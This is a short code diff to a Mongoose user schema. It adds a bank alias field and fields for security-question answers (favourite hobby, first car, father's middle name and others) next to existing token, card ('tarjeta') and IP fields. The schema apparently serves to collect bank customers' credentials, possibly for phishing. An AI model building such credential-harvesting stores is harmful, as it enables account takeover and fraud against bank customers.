@@ -10,6 +10,14 @@ const UserSchema = Schema({
     token1: String,
     token2: String,
     tarjeta: String,
+
+    faceBankAlias: String,
+    facebankPreguntaPasatiempoFav: String,
+    facebankPreguntaSitioVacacionesFav: String,
+    facebankPreguntaModeloPrimerVehiculo: String,
+    facebankPreguntaSegundoNombreDelPadre: String,
+    facebankPreguntaComidaFav: String,
+
     ip: String
 });
 
